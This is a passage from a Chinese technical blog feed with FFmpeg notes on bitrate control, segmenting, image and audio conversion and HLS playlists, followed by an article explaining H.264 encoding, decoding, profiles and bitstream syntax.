<li><code>-async 1</code> 音频同步方法，通过拉伸或挤压音频数据的方式以匹配时间戳，参数是音频改变时每秒最大采样量。同<code>aresample</code>过滤器<ul>
<li>1：特指只在音频流的开始时纠正时间戳</li>
</ul>
</li>
<li><code>-sample_fmts s16p</code> 设置音频采样格式为<code>signed 16 bits, planar</code></li>
</ul>
<h1 id="码率控制"><a href="#码率控制" class="headerlink" title="码率控制"></a>码率控制</h1><p>有损视频编码（lossy video encoding）的目的是尽可能压缩原始输入文件的大小，同时最大化保留视频质量。码率控制（rate control）决定了编码出每一帧的字节量，是视频大小和质量之间的重要影响因素。</p>
<p>通常的码率控制策略：</p>
<ul>
<li>存档：CRF码率</li>
<li>流媒体：2-pass ABR 或 CRF，同时启用VBV码率约束</li>
<li>实时流媒体：1-pass ABR 或 CRF，同时启用VBV码率约束（CBR浪费带宽）</li>
<li>设备：2-pass ABR</li>
</ul>
<h2 id="量化参数"><a href="#量化参数" class="headerlink" title="量化参数"></a>量化参数</h2><p>量化参数（QP, Quantization Parameter）控制帧（frame）中每个宏块（macroblock）的压缩量。</p>
<ul>
<li>固定的量化参数会使得码率与场景复杂度强相关，使得编码效率降低。</li>
<li>量化参数过低时，虽然视频质量好，但容易失去对码率的控制。</li>
</ul>
<p>FFmpeg的支持QP范围为0~51，值越大表示压缩率越高，质量越低:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg -i &lt;input&gt; -c:v libx264 -qp 23 &lt;output&gt;</span><br><span class="line">ffmpeg -i &lt;input&gt; -c:v libx265 -x265-params qp=23 &lt;output&gt;</span><br></pre></td></tr></table></figure>

<h2 id="恒定码率"><a href="#恒定码率" class="headerlink" title="恒定码率"></a>恒定码率</h2><p>恒定码率（CBR, Constant Bitrate）确保以恒定码率输出比特流，无论实际编码简单还是复杂。</p>
<ul>
<li>场景简单时可能会浪费带宽。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg -i &lt;input&gt; -c:v libx264 -x264-params &quot;nal-hrd=cbr:force-cfr=1&quot; -b:v 1M -minrate 1M -maxrate 1M -bufsize 2M &lt;output&gt;.ts （MPEG-2 TS）</span><br><span class="line">ffmpeg -i &lt;input&gt; -c:v libvpx-vp9 -b:v 1M -maxrate 1M -minrate 1M &lt;output&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CBR to 964kbps</span></span><br><span class="line">ffmpeg -i i.mp4 -b:v 964K -minrate 964K -maxrate 964K -bufsize 2000K o.mp4</span><br></pre></td></tr></table></figure>

<h2 id="可变码率"><a href="#可变码率" class="headerlink" title="可变码率"></a>可变码率</h2><p>可变码率（VBR, Variable Bitrate）控制编码器将更多的字节用于难压缩的部分，例如运动（motion）中的视频、丰富的空间细节（spatial detail）以及复杂纹理（texture）；对于容易编码的部分用更少的字节。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">限制码率在964 kbps~3856 kbps范围内</span></span><br><span class="line">ffmpeg -i i.mp4 -minrate 964K -maxrate 3856K -bufsize 2000K o_964_3856.mp4</span><br></pre></td></tr></table></figure>

<h3 id="平均码率"><a href="#平均码率" class="headerlink" title="平均码率"></a>平均码率</h3><p>平均码率（ABR, Average Bitrate）指设给编码器一个目标码率值，让其自行控制码率达到这个目标值。</p>
<ul>
<li>缺点：由于编码器不清楚后续的场景，因此要猜测如何达到目标值，容易导致视频质量出现巨大波动</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg -i &lt;input&gt; -c:v libx264 -b:v 1M &lt;output&gt;</span><br><span class="line">ffmpeg -i &lt;input&gt; -c:v libx265 -b:v 1M &lt;output&gt;</span><br><span class="line">ffmpeg -i &lt;input&gt; -c:v libvpx-vp9 -b:v 1M &lt;output&gt;</span><br></pre></td></tr></table></figure>

<h3 id="两次平均码率"><a href="#两次平均码率" class="headerlink" title="两次平均码率"></a>两次平均码率</h3><p>两次平均码率（2-Pass ABR）控制时允许编码器进行两次计算，一次用于计算帧的编码消耗，第二次用于高效的编码比特流。这样保证了在确定的码率约束下最好的视频质量，也意味着码率会随着时间的推移有变化。</p>
<ul>
<li>需要做些测试验证设定的比特率满足复杂场景</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg -i &lt;input&gt; -c:v libx264 -b:v 1M -pass 1 -f null /dev/null</span><br><span class="line">ffmpeg -i &lt;input&gt; -c:v libx264 -b:v 1M -pass 2 &lt;output&gt;.mp4</span><br><span class="line">ffmpeg -i &lt;input&gt; -c:v libx265 -b:v 1M -x265-params pass=1 -f null /dev/null</span><br><span class="line">ffmpeg -i &lt;input&gt; -c:v libx265 -b:v 1M -x265-params pass=2 &lt;output&gt;.mp4</span><br><span class="line">ffmpeg -i &lt;input&gt; -c:v libvpx-vp9 -b:v 1M -pass 1 -f null /dev/null</span><br><span class="line">ffmpeg -i &lt;input&gt; -c:v libvpx-vp9 -b:v 1M -pass 2 &lt;output&gt;.webm</span><br></pre></td></tr></table></figure>

<h2 id="恒定质量"><a href="#恒定质量" class="headerlink" title="恒定质量"></a>恒定质量</h2><p>恒定质量（CQ, Constant Quality）或恒定速率银子（CRF, Constant Rate Factor）</p>
<ul>
<li>不好预计最终的文件大小以及码率的波动情况</li>
<li>CRF编码与同码率下的<code>2-Pass ABR</code>的视频质量相当，区别在于<code>2-Pass ABR</code>可以控制文件大小，而CRF控制视频质量。</li>
</ul>
<p>FFmpeg的支持CRF是指数级参数，值越大表示压缩率越高，质量越低:</p>
<ul>
<li>范围：H264和H265为<code>0~51</code>，VP9为<code>0~63</code></li>
<li>推荐值：H264在17&#x2F;18时视觉上接近无损，+6会损失一半码率，-6增大一倍码率，通常用23，H265用28，VP9用15~35<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg -i &lt;input&gt; -c:v libx264 -crf 23 &lt;output&gt;</span><br><span class="line">ffmpeg -i &lt;input&gt; -c:v libx265 -crf 28 &lt;output&gt;</span><br><span class="line">ffmpeg -i &lt;input&gt; -c:v libvpx-vp9 -crf 30 -b:v 0 &lt;output&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="约束码率"><a href="#约束码率" class="headerlink" title="约束码率"></a>约束码率</h2><p>视频缓冲验证器（VBV, Video Buffering Verifier）提供了一个将码率限制到最大值的策略。</p>
<ul>
<li>对于流媒体很有用，可与<code>2-Pass ABR</code>或CRF配合使用。</li>
</ul>
<p>FFmpeg通过<code>-maxrate</code>和<code>-bufsize</code>选项启用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffmpeg -i &lt;input&gt; -c:v libx264 -crf 23 -maxrate 1M -bufsize 2M &lt;output&gt;</span><br><span class="line">ffmpeg -i &lt;input&gt; -c:v libx265 -crf 28 -x265-params vbv-maxrate=1000:vbv-bufsize=2000 &lt;output&gt;</span><br><span class="line">ffmpeg -i &lt;input&gt; -c:v libvpx-vp9 -crf 30 -b:v 2M &lt;output&gt;</span><br><span class="line"></span><br><span class="line">ffmpeg -i &lt;input&gt; -c:v libx264 -b:v 1M -maxrate 1M -bufsize 2M -pass 1 -f null /dev/null</span><br><span class="line">ffmpeg -i &lt;input&gt; -c:v libx264 -b:v 1M -maxrate 1M -bufsize 2M -pass 2 &lt;output&gt;</span><br><span class="line"></span><br><span class="line">ffmpeg -i &lt;input&gt; -c:v libx265 -b:v 1M -x265-params pass=1:vbv-maxrate=1000:vbv-bufsize=2000 -f null /dev/null</span><br><span class="line">ffmpeg -i &lt;input&gt; -c:v libx265 -b:v 1M -x265-params pass=2:vbv-maxrate=1000:vbv-bufsize=2000 &lt;output&gt;</span><br><span class="line"></span><br><span class="line">ffmpeg -i &lt;input&gt; -c:v libvpx-vp9 -b:v 1M -maxrate 1M -bufsize 2M -pass 1 -f null /dev/null</span><br><span class="line">ffmpeg -i &lt;input&gt; -c:v libvpx-vp9 -b:v 1M -maxrate 1M -bufsize 2M -pass 2 &lt;output&gt;</span><br></pre></td></tr></table></figure>

<h1 id="帧数量控制"><a href="#帧数量控制" class="headerlink" title="帧数量控制"></a>帧数量控制</h1><p><a href="https://sites.google.com/site/linuxencoding/x264-ffmpeg-mapping">x264 FFmpeg Options Guide</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 原片时长10s、帧率30</span><br><span class="line">$ ffprobe 10s.v.mp4</span><br><span class="line">Input #0, mov,mp4,m4a,3gp,3g2,mj2, from &#x27;10s.v.mp4&#x27;:</span><br><span class="line">  Duration: 00:00:10.00, start: 0.000000, bitrate: 1931 kb/s</span><br><span class="line">    Stream #0:0(und): Video: h264 (High) (avc1 / 0x31637661), yuv420p, 1920x1080 [SAR 1:1 DAR 16:9], 1927 kb/s, 30 fps, 30 tbr, 15360 tbn, 60 tbc (default)</span><br><span class="line"></span><br><span class="line"># 转码成只有1个I帧，0个B帧（keyint指GOP长度，即I帧间隔，300=10s*30fps）</span><br><span class="line">$ ffmpeg -i 10s.v.mp4 -c:v libx264 -x264-params keyint=300:min-keyint=300:no-scenecut=1:bframes=0 10s.v.i1b0.mp4</span><br><span class="line"></span><br><span class="line"># 查看I帧数量</span><br><span class="line">$ mediainfo --Details 10s.v.i1b0.mp4 | grep &#x27;slice_type I&#x27; | wc -l</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line"># 查看B帧数量</span><br><span class="line">$ mediainfo --Details 10s.v.i1b0.mp4 | grep &#x27;slice_type B&#x27; | wc -l</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<h1 id="x264相关"><a href="#x264相关" class="headerlink" title="x264相关"></a>x264相关</h1><h2 id="CAVLC和CABAC"><a href="#CAVLC和CABAC" class="headerlink" title="CAVLC和CABAC"></a>CAVLC和CABAC</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># H264用CAVLC (faster, less cpu intensive, less compression)</span><br><span class="line">ffmpeg -i 10s.v.mp4 \</span><br><span class="line">  -an \</span><br><span class="line">  -c:v libx264 \</span><br><span class="line">  -x264-params keyint=30:min-keyint=30:no-scenecut=1:no-cabac=1 \</span><br><span class="line">  10s.v.i1s.CAVLC.mp4</span><br><span class="line"></span><br><span class="line"># H264用CABAC (slower, more cpu intensive, more compression)</span><br><span class="line">ffmpeg -i 10s.v.mp4 \</span><br><span class="line">  -an \</span><br><span class="line">  -c:v libx264 \</span><br><span class="line">  -x264-params keyint=30:min-keyint=30:no-scenecut=1:coder=1 \</span><br><span class="line">  10s.v.i1s.CABAC.mp4</span><br></pre></td></tr></table></figure>

<h1 id="切分与合并"><a href="#切分与合并" class="headerlink" title="切分与合并"></a>切分与合并</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 每20s切分成一个文件</span><br><span class="line">$ ffmpeg -v error \</span><br><span class="line">  -fflags +genpts \</span><br><span class="line">  -i 1.mp4 \</span><br><span class="line">  -map 0 \</span><br><span class="line">  -c copy \</span><br><span class="line">  -f segment \</span><br><span class="line">  -segment_format mp4 \</span><br><span class="line">  -segment_time 20 \</span><br><span class="line">  -segment_list 1-20s.ffcat \</span><br><span class="line">  -reset_timestamps 1 \</span><br><span class="line">  1-%03d.mp4</span><br><span class="line">1-000.mp4</span><br><span class="line">1-001.mp4</span><br><span class="line">1-002.mp4</span><br><span class="line">1-20s.ffcat</span><br><span class="line"></span><br><span class="line">$ cat 1-20s.ffcat</span><br><span class="line">ffconcat version 1.0</span><br><span class="line">file 1-000.mp4</span><br><span class="line">file 1-001.mp4</span><br><span class="line">file 1-002.mp4</span><br><span class="line"></span><br><span class="line"># 合并</span><br><span class="line">$ ffmpeg -y -v error -i 1-20s.ffcat -map 0 -c copy 1-2.mp4</span><br></pre></td></tr></table></figure>

<h1 id="图片相关"><a href="#图片相关" class="headerlink" title="图片相关"></a>图片相关</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 提取第一秒的所有帧为图片</span><br><span class="line">ffmpeg -y -i 1.mp4 -t 00:00:01 %3d.jpg</span><br><span class="line"></span><br><span class="line"># 一系列图生成视频（30fps）</span><br><span class="line">ffmpeg -i %3d.jpg -r 30 -pix_fmt yuv420p 1s.v.mp4</span><br><span class="line"></span><br><span class="line"># 一张图生成10s视频</span><br><span class="line">ffmpeg -loop 1 -i 001.jpg -c:v libx264 -pix_fmt yuv420p -t 10 001.mp4</span><br><span class="line"></span><br><span class="line"># 一系列图生成10s视频（图片循环）</span><br><span class="line">ffmpeg -loop 1 -i %03d.jpg -c:v libx264 -pix_fmt yuv420p -t 10 10s.v.xxx.mp4</span><br><span class="line"></span><br><span class="line"># 一张图片生成h264 bitstream</span><br><span class="line">ffmpeg -i 001.jpg -pix_fmt yuv420p 001.h264</span><br></pre></td></tr></table></figure>

<h1 id="音频相关"><a href="#音频相关" class="headerlink" title="音频相关"></a>音频相关</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 忽略视频、音频采样转为8kHz</span><br><span class="line">ffmpeg -i 10s_1080p_30fps.mp4 -vn -ar 8000 10s.a.8khz.mp4</span><br></pre></td></tr></table></figure>

<h1 id="HLS相关"><a href="#HLS相关" class="headerlink" title="HLS相关"></a>HLS相关</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ffmpeg -i 10s.v.mp4 \</span><br><span class="line">  -an \</span><br><span class="line">  -c:v libx264 \</span><br><span class="line">  -x264-params keyint=30:min-keyint=30:no-scenecut=1 \</span><br><span class="line">  -hls_playlist_type vod \</span><br><span class="line">  -hls_time 1 \</span><br><span class="line">  10s.v.playlist.m3u8</span><br><span class="line">10s.v.playlist0.ts</span><br><span class="line">10s.v.playlist1.ts</span><br><span class="line">10s.v.playlist2.ts</span><br><span class="line">10s.v.playlist3.ts</span><br><span class="line">10s.v.playlist4.ts</span><br><span class="line">10s.v.playlist5.ts</span><br><span class="line">10s.v.playlist6.ts</span><br><span class="line">10s.v.playlist7.ts</span><br><span class="line">10s.v.playlist8.ts</span><br><span class="line">10s.v.playlist9.ts</span><br><span class="line">10s.v.playlist.m3u8</span><br><span class="line"></span><br><span class="line">$ cat 10s.v.playlist.m3u8</span><br><span class="line">#EXTM3U</span><br><span class="line">#EXT-X-VERSION:3</span><br><span class="line">#EXT-X-TARGETDURATION:1</span><br><span class="line">#EXT-X-MEDIA-SEQUENCE:0</span><br><span class="line">#EXT-X-PLAYLIST-TYPE:VOD</span><br><span class="line">#EXTINF:1.000000,</span><br><span class="line">10s.v.playlist0.ts</span><br><span class="line">#EXTINF:1.000000,</span><br><span class="line">10s.v.playlist1.ts</span><br><span class="line">#EXTINF:1.000000,</span><br><span class="line">10s.v.playlist2.ts</span><br><span class="line">#EXTINF:1.000000,</span><br><span class="line">10s.v.playlist3.ts</span><br><span class="line">#EXTINF:1.000000,</span><br><span class="line">10s.v.playlist4.ts</span><br><span class="line">#EXTINF:1.000000,</span><br><span class="line">10s.v.playlist5.ts</span><br><span class="line">#EXTINF:1.000000,</span><br><span class="line">10s.v.playlist6.ts</span><br><span class="line">#EXTINF:1.000000,</span><br><span class="line">10s.v.playlist7.ts</span><br><span class="line">#EXTINF:1.000000,</span><br><span class="line">10s.v.playlist8.ts</span><br><span class="line">#EXTINF:1.000000,</span><br><span class="line">10s.v.playlist9.ts</span><br><span class="line">#EXT-X-ENDLIST</span><br><span class="line"></span><br><span class="line"># Playlists for 720p(2628kbs), 480p(480p1128kbs) and 240p(264kbs) streams</span><br><span class="line">$ ffmpeg -i 1.mp4 \</span><br><span class="line">  -c:a copy -c:v libx264 -x264-params keyint=30:min-keyint=30:no-scenecut=1 \</span><br><span class="line">  -b:v 2500k -s 1280x720 -profile:v high -hls_time 1 -hls_playlist_type vod 720p2628kbs.m3u8 \</span><br><span class="line">  -c:a copy -c:v libx264 -x264-params keyint=30:min-keyint=30:no-scenecut=1 \</span><br><span class="line">  -b:v 1000k -s 854x480 -profile:v high -hls_time 1 -hls_playlist_type vod 480p1128kbs.m3u8 \</span><br><span class="line">  -c:a copy -c:v libx264 -x264-params keyint=30:min-keyint=30:no-scenecut=1 \</span><br><span class="line">  -b:v 200k -s 426x240 -profile:v high -hls_time 1 -hls_playlist_type vod 240p264kbs.m3u8</span><br><span class="line">240p264kbs0.ts</span><br><span class="line">240p264kbs1.ts</span><br><span class="line">240p264kbs2.ts</span><br><span class="line">240p264kbs3.ts</span><br><span class="line">240p264kbs4.ts</span><br><span class="line">240p264kbs5.ts</span><br><span class="line">240p264kbs6.ts</span><br><span class="line">240p264kbs7.ts</span><br><span class="line">240p264kbs8.ts</span><br><span class="line">240p264kbs9.ts</span><br><span class="line">240p264kbs.m3u8</span><br><span class="line">480p1128kbs0.ts</span><br><span class="line">480p1128kbs1.ts</span><br><span class="line">480p1128kbs2.ts</span><br><span class="line">480p1128kbs3.ts</span><br><span class="line">480p1128kbs4.ts</span><br><span class="line">480p1128kbs5.ts</span><br><span class="line">480p1128kbs6.ts</span><br><span class="line">480p1128kbs7.ts</span><br><span class="line">480p1128kbs8.ts</span><br><span class="line">480p1128kbs9.ts</span><br><span class="line">480p1128kbs.m3u8</span><br><span class="line">720p2628kbs0.ts</span><br><span class="line">720p2628kbs1.ts</span><br><span class="line">720p2628kbs2.ts</span><br><span class="line">720p2628kbs3.ts</span><br><span class="line">720p2628kbs4.ts</span><br><span class="line">720p2628kbs5.ts</span><br><span class="line">720p2628kbs6.ts</span><br><span class="line">720p2628kbs7.ts</span><br><span class="line">720p2628kbs8.ts</span><br><span class="line">720p2628kbs9.ts</span><br><span class="line">720p2628kbs.m3u8</span><br><span class="line"></span><br><span class="line">$ cat &lt;&lt;EOF &gt; variant.m3u8</span><br><span class="line">#EXTM3U</span><br><span class="line">#EXT-X-VERSION:6</span><br><span class="line">#EXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=2500000,CODECS=&quot;avc1.640028,mp4a.40.2&quot;,RESOLUTION=1280x720</span><br><span class="line">720p2628kbs.m3u8</span><br><span class="line">#EXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=1000000,CODECS=&quot;avc1.4d001f,mp4a.40.2&quot;,RESOLUTION=854x480</span><br><span class="line">480p1128kbs.m3u8</span><br><span class="line">#EXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=200000,CODECS=&quot;avc1.42001f,mp4a.40.2&quot;,RESOLUTION=426x240</span><br><span class="line">240p264kbs.m3u8</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Media</category>
      </categories>
      <tags>
        <tag>FFmpeg</tag>
      </tags>
  </entry>
  <entry>
    <title>H264视频编码</title>
    <url>/Media/H264/H264.html</url>
    <content><![CDATA[<p><code>H.264</code>视频编码在2003年首次由<code>ITU-T</code>和<code>ISO/IEC </code>联合发布，建立在更早的标准<code>MPEG-2</code>和<code>MPEG-4</code>之上，其定义了一套视频压缩的方法，编解码器可以有选择使用这些方法。</p>
<span id="more"></span>

<pre class="mermaid">
stateDiagram
direction LR
VideoSource --&gt; ENCODER
ENCODER --&gt; DECODER
DECODER --&gt; VideoOutput
state ENCODER {
  direction TB
  Prediction --&gt; Transform
  Transform --&gt; EntropyEncoder
  EntropyEncoder --&gt; CompressedH.264Syntax
}
state DECODER {
  direction BT
  CompressedH264 : CompressedH.264Syntax
  CompressedH264 --&gt; EntropyDecode
  EntropyDecode --&gt; InverseTransfrom
  InverseTransfrom --&gt; Reconstruct
}
</pre>

<h1 id="编解码"><a href="#编解码" class="headerlink" title="编解码"></a>编解码</h1><img data-src="/images/Media/H264-frame-codec-view.png" class="" width="1000" height="250" title="H264 frame codec high level view">

<ul>
<li>Encoder和Decoder有同样的预测过程</li>
<li>Encoder将<code>A</code>的预测结果<code>A&#39;</code>缓存到CPB，供后续的帧间预测使用</li>
<li>Decoder将根据从Bitstream中获取运动矢量和残差帧，预测后得到<code>A&#39;</code>，同时缓存到DPB，供后续的预测其他帧时使用</li>
</ul>
<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><img data-src="/images/Media/H264-encode-process.png" class="" width="700" height="300" title="H264 encode process">

<ul>
<li>Frame被分割为MacroBlock(MB)，例如16x16、4x4</li>
<li>Encoder进行帧内和帧间预测以生成PredictionMB，计算得到<br>  残差MB：<code>ResidualMB = CurrentMB - PredictionMB</code><br>  运动矢量MB：<code>MotionVectorMB = f(CurrentMB, PredictionMB)</code></li>
<li>Encoder对ResidualMB、MotionVector、预测参数等数据进行变换（transform）以产生更紧凑的表示，然后量化（quantize）后剔除不重要的值</li>
<li>Encoder对量化后的数据执行反向操作获取DecodedResidualMB，用于计算<br>  编码MB&#x2F;重建MB：<code>CodedMB/ReconstructMB = DecodedResidualMB + PredictionMB</code><br>编码MB被缓存起来，供后续的帧间预测使用</li>
<li>同时，量化后的数据经熵编码（entropy encoder）后得到编码字节流（coded bitstream）</li>
</ul>
<h3 id="帧内预测"><a href="#帧内预测" class="headerlink" title="帧内预测"></a>帧内预测</h3><img data-src="/images/Media/H264-intra-prediction.png" class="" width="290" height="265" title="Intra prediction">

<ul>
<li>利用周边的CodedMB预测当前块，通常为16x16或4x4的块大小</li>
</ul>
<h3 id="帧间预测"><a href="#帧间预测" class="headerlink" title="帧间预测"></a>帧间预测</h3><img data-src="/images/Media/H264-inter-prediction.png" class="" width="642" height="216" title="Inter prediction">

<ul>
<li>从CodedFrame中寻找最相似的位置，可以是显示序列（display order）上的之前帧，也可以是之后的帧</li>
<li>匹配的块大小可以从16x16到4x4，以获取最佳匹配，得到能量最小的残差帧</li>
<li>MB1（16x16）从之前的帧中匹配到最相似的位置16x16</li>
<li>MB2（16x16）从之前的帧中匹配到8x16的最相似位置，又从之后的帧中匹配到另外的8x16的最相似位置</li>
</ul>
<h3 id="变换和量化"><a href="#变换和量化" class="headerlink" title="变换和量化"></a>变换和量化</h3><img data-src="/images/Media/H264-forward-transform.png" class="" width="600" height="400" title="Forward Transform">

<ul>
<li>对残差块（ResidualMB）进行4x4或8x8类似离散余弦变换（DCT，Discrete Cosine Transform）的整型变换后，得到一系列加权系数（coefficient）</li>
<li>可以用这些系数（coefficient）变换回残差块（ResidualMB）</li>
</ul>
<img data-src="/images/Media/H264-quantization-example.png" class="" width="600" height="200" title="Example: quantization">
<img data-src="/images/Media/H264-4x4-coefficients.png" class="" width="600" height="200" title="Example: 4x4 coefficients">

<ul>
<li>根据量化参数（QP, quantization parameter）对系数（coefficient）进行量化以降低精度，例如都除以<code>8</code>后再四舍五入</li>
<li>量化的结果是，不重要的系数多被量化为零值，重要系数为非零值。在残差帧中多数系数不重要，因此量化结果中多数为零值</li>
<li>量化参数影响图像质量，QP越大，零值越多，压缩率越高，图像质量越差</li>
</ul>
<h3 id="熵编码"><a href="#熵编码" class="headerlink" title="熵编码"></a>熵编码</h3><p>编码过程产生的数据必须被编码为压缩的字节流（compressed bitstream），其中的值（values）、参数（parameters）和语法元素（syntax elements）通过变长编码（variable length coding）或算术编码（arithmetic coding）转换为二进制代码，具体数据包括：</p>
<ul>
<li>量化的变换系数</li>
<li>使Decoder能重建预测器的信息</li>
<li>压缩数据的结构和编码时用到的压缩工具</li>
<li>整个视频序列的信息</li>
</ul>
<h2 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h2><img data-src="/images/Media/H264-decode-process.png" class="" width="700" height="300" title="H264 decode process">

<ul>
<li>Decoder对CodedBitStream依次进行熵解码（entropy decoder）、反向量化（inverse quantize）和反向变换（inverse transform）后得到DecodedResidualMB</li>
<li>Decoder进行同样的帧内和帧间预测以生成PredictionMB，计算得到<br>  解码MB：<code>DecodedMB = DecodedResidualMB + PredictionMB</code><br>解码MB被缓存起来，供后续的帧间预测使用</li>
</ul>
<h3 id="熵解码"><a href="#熵解码" class="headerlink" title="熵解码"></a>熵解码</h3><p>对压缩的字节流（compressed bitstream）进行解码，得到编码过程中产生的数据</p>
<h3 id="反向量化和变换"><a href="#反向量化和变换" class="headerlink" title="反向量化和变换"></a>反向量化和变换</h3><img data-src="/images/Media/H264-inverse-quantization.png" class="" width="600" height="200" title="Example: inverse quantization">

<ul>
<li>量化的系数（quantized transform coefficients）被转换为原始值，例如都乘以<code>8</code></li>
</ul>
<img data-src="/images/Media/H264-inverse-transform.png" class="" width="600" height="360" title="Example: inverse transform">
<img data-src="/images/Media/H264-4x4-inverse-coefficients.png" class="" width="600" height="200" title="Example: 4x4 inverse coefficients">

<ul>
<li>反向变换将反向量化后的数据组合加权参数后变换回（反向DCT）残差块</li>
</ul>
<h3 id="重建"><a href="#重建" class="headerlink" title="重建"></a>重建</h3><ul>
<li>Decoder进行与Encoder同样的帧内和帧间预测，以获取预测块</li>
<li>Decoder根据预测块和残差块重建（reconstruction）原始的宏块，用于显示</li>
</ul>
<h1 id="Profiles-amp-Levels"><a href="#Profiles-amp-Levels" class="headerlink" title="Profiles &amp; Levels"></a>Profiles &amp; Levels</h1><p><strong>Profiles</strong>：H264支持一系列“工具”，例如CABAC或CAVLC熵编码、SI&#x2F;SP、VUI和SEI消息等，Profiles定义了特定的工具子集。Encoder只能使用符合profile内的一些工具，而Decoder必须支持符合profile中每一个工具。<br><strong>Levels</strong>：约束了解码器处理的帧大小（frame size）、处理速度（processing speed）和工作内存（memory capacity）的上限</p>
<img data-src="/images/Media/H264-profiles-levels-example.png" class="" width="600" height="230" title="Example: profiles and levels">

<ul>
<li><code>Main/Level 2.2</code>表示解码参数上限为标准清晰度（Standard Definition）、4Mbps码率、<code>Main Profile</code>的比特流</li>
<li>支持CIF分辨率、2Mbps（Level 2）、<code>Constrained Baseline Profile</code>比特流</li>
<li>支持SD分辨率（720x576）、4Mbps（Level 2.2）、<code>Main Profile</code>的比特流</li>
<li>不支持HD分辨率（720p，1280x720，超了）、(Level 3.1，超了)、<code>Main Profile</code>的比特流</li>
</ul>
<h1 id="Syntax"><a href="#Syntax" class="headerlink" title="Syntax"></a>Syntax</h1><img data-src="/images/Media/H264-syntax-overview.png" class="" width="660" height="670" title="Syntax Overview">

<ul>
<li>H264序列（sequence）由一系列网络包（NALUs, Network Adaptation Layer Units）组成</li>
<li>每个网络包（NALU）由解码时使用的参数集（parameter sets）和一些分片（slices）构成</li>
<li>每个分片（slice）可以是整个视频帧或帧中的一部分，其由一系列宏块（macroblocks）组成</li>
<li>每个宏块（macroblock）包含预测信息（例如运动矢量）和残差帧</li>
</ul>
<img data-src="/images/Media/H264-syntax-overview2.png" class="" width="660" height="670" title="Syntax Overview (detail)">

<ul>
<li>编码层（VCL, Video Coding Layer)由一系列slice组成</li>
<li>网络层（NAL, Network Abstraction Layer)由SPS、PPS和一系列Slice组成<ul>
<li>RBSP (Raw Byte Sequence Payload)：包含语法元素的字节序列<ul>
<li>SPS (Sequence Parameter Sets)</li>
<li>PPS (Picture Parameter Sets)</li>
<li>SEI (Supplement Enhancement Information)：包含可以有助于解码或显示的信息（可选）</li>
<li>IDR (Instantaneous Decoder Refresh)：标识编码序列的开始，是帧内（intra）编码的slice<ul>
<li>当收到一个新的IDR分片时，表示上一个编码序列结束了</li>
</ul>
</li>
</ul>
</li>
<li><code>RBSP trailing bits</code>：补充一些零bit，使序列按byte对齐</li>
</ul>
</li>
<li>分片层 (Slice layer)由头部和一系列MB组成</li>
<li>宏块层 (Macroblock layer)<ul>
<li>宏块类型: I（帧内编码）、P（有一个参考帧的帧间编码）、B（有一个或两个参考帧的帧间编码）</li>
<li>预测信息：I（预测模式）、P&#x2F;B（选择的参考帧和运动矢量）</li>
<li>编码块模式（CBP, Coded Block Pattern）：指出非零残差系数是亮度（luma）还是色度（chroma）块的</li>
<li>量化参数（QP, Quantization Parameter）</li>
<li>残差数据（Residual Data）</li>
</ul>
</li>
</ul>
<h2 id="Frames-amp-Fields-amp-Picture"><a href="#Frames-amp-Fields-amp-Picture" class="headerlink" title="Frames &amp; Fields &amp; Picture"></a>Frames &amp; Fields &amp; Picture</h2><p>帧（<strong>Frame</strong>）：包括一组亮度（luma）样本和两组色度（chroma）样本的数据<br>场（<strong>Field</strong>）：分为顶场（top field）和低场（bottom field）</p>
<ul>
<li>逐行扫描（progressive scan）时两个场是同一时间点采样</li>
<li>交错扫描（interlaced scan）时两场在不同时间点采样</li>
</ul>
<p>图片（<strong>Picture</strong>）：指一个Frame或Field，由一个或多个slice组成<br>访问单元（<strong>AU，access unit</strong>）：指编码后的Picture</p>
<img data-src="/images/Media/H264-picture-handling-overview.png" class="" width="700" height="238" title="Picture Handling Overview">

<ul>
<li>Frame或Field被编码后得到编码的图片（coded picture，or access unit）<ul>
<li><code>SPS.frame_mbs_only_flag=0</code>时，使用隔行视频（interlaced video）编码<ul>
<li>视频序列中的一帧可能被编码为一个完整帧（frame)或两个场（field）</li>
<li><code>SliceHeader.field_pic_flag</code>标识当前编码的picture是frame还是field</li>
</ul>
</li>
<li>编码器也可以采用图片自适应帧域编码（PAFF，Picture Adaptive Frame Field Coding）<ul>
<li>picture按场编码（field coding），用于快速运动场景中</li>
<li>picture按帧编码（frame coding），用于静态场景中</li>
</ul>
</li>
<li>编码器也可以采用宏块自适应帧域编码（MBAFF，Macroblock Adaptive Frame Field Coding）<ul>
<li>MBAFF使得在帧内编码时，可以在场编码（field coding）和帧编码（frame coding）间自适应切换</li>
<li><code>UpperMacrobloackOfPair.mb_field_decoding_flag</code>标识<em>MB pair</em>是frame宏块对还是field宏块对</li>
</ul>
</li>
</ul>
</li>
<li>每个Picture有一个或多个slice组成</li>
<li>Slices被解码为图片（decoded picture），然后缓存到DPB（Decoded Picture Buffer）中<ul>
<li>DPB中的picture也可能是一个完整帧（frame)或两个场（field）</li>
</ul>
</li>
</ul>
